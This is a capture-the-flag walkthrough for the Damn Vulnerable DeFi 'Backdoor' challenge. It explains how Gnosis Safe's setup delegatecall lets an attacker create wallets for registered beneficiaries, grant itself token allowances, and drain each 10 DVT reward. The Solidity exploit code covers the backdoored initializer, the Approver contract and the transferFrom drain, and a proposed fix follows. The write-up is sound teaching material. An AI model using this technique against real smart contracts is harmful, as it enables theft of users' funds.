## Challenge 11 Walkthrough: Backdoor

### Vulnerability

`WalletRegistry` rewards 10 DVT to any freshly created Safe whose single owner is a registered beneficiary. It registers itself as the `createProxyWithCallback` callback, so the factory invokes `proxyCreated` right after deploying each Safe:

```solidity
function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
    ...
    if (bytes4(initializer[:4]) != Safe.setup.selector) {
        revert InvalidInitialization();
    }
    ...
    address fallbackManager = _getFallbackManager(walletAddress);
    if (fallbackManager != address(0)) {
        revert InvalidFallbackManager(fallbackManager);
    }

    beneficiaries[walletOwner] = false;
    wallets[walletOwner] = walletAddress;

    SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);  // ← 10 DVT to the new Safe
}
```

The registry validates the owner set, the threshold, and the fallback manager — but it cannot constrain the `to`/`data` arguments of `Safe.setup`, which execute a **delegatecall** during initialization:

```solidity
// Safe.setup → setupModules(to, data)
function setupModules(address to, bytes memory data) internal {
    require(modules[SENTINEL_MODULES] == address(0), "GS100");
    modules[SENTINEL_MODULES] = SENTINEL_MODULES;
    if (to != address(0)) {
        require(isContract(to), "GS002");
        require(execute(to, 0, data, Enum.Operation.DelegateCall, type(uint256).max), "GS000"); // ← delegatecall
    }
}
```

Anyone can create a Safe *on behalf of* a beneficiary (the beneficiary need not consent), and the setup delegatecall runs arbitrary code in the new Safe's context — before the registry pays it.

### Exploit

```solidity
function test_backdoor() public checkSolvedByPlayer {
    new BackdoorAttacker(
        users,
        address(walletRegistry),
        address(walletFactory),
        address(singletonCopy),
        address(token),
        recovery
    );
}
```

The whole attack runs in the attacker's constructor, so `vm.getNonce(player) == 1` holds.

**Inside the constructor**, for each of the four beneficiaries:

**Step 1 — Build a backdoored `setup`.** The `to`/`data` delegatecall an `Approver` that makes the Safe approve the attacker for 10 DVT. `fallbackHandler` must be `address(0)` to satisfy the registry's fallback-manager check.

```solidity
bytes memory setupData = abi.encodeWithSignature(
    "approve(address,address,uint256)", token, address(this), 10e18
);
bytes memory initializer = abi.encodeWithSelector(
    ISafeSetup.setup.selector,
    owners,            // [beneficiary]
    uint256(1),        // threshold
    address(approver), // to (delegatecall)
    setupData,         // data
    address(0),        // fallbackHandler
    address(0), address(0), uint256(0), payable(address(0))
);
```

```solidity
// Approver, delegatecalled in the Safe's context
function approve(address token, address spender, uint256 amount) external {
    IERC20Like(token).approve(spender, amount);  // msg.sender to the token IS the Safe
}
```

**Step 2 — Deploy via the factory callback.** The factory deploys the Safe, the setup delegatecall sets the allowance, then the registry pays the Safe 10 DVT.

```solidity
ISafeProxyFactory(factory).createProxyWithCallback(singleton, initializer, i, registry);
```

**Step 3 — Drain the funded Safe.** Using the allowance set during setup, pull the 10 DVT to recovery.

```solidity
address wallet = WalletRegistry(registry).wallets(beneficiaries[i]);
IERC20Like(token).transferFrom(wallet, recovery, 10e18);
```

After four iterations, recovery holds all 40 DVT.

### Why It Works

The registry trusts that a "legitimately structured" Safe is also a Safe the beneficiary controls, but `Safe.setup` lets the deployer inject a one-time delegatecall that executes arbitrary logic as the new wallet. The attacker uses that hook to grant itself an allowance before the registry's reward even arrives, so each reward is siphoned the moment it lands.

The fix is to bind wallet creation to the beneficiary's own action (e.g. require the beneficiary to be `msg.sender`/signer of the deployment) or to reject any `setup` with a non-zero `to`/module-delegatecall.

This is a **Gnosis Safe setup-delegatecall backdoor** — four wallets created for four beneficiaries, each drained of its 10 DVT reward in a single transaction.
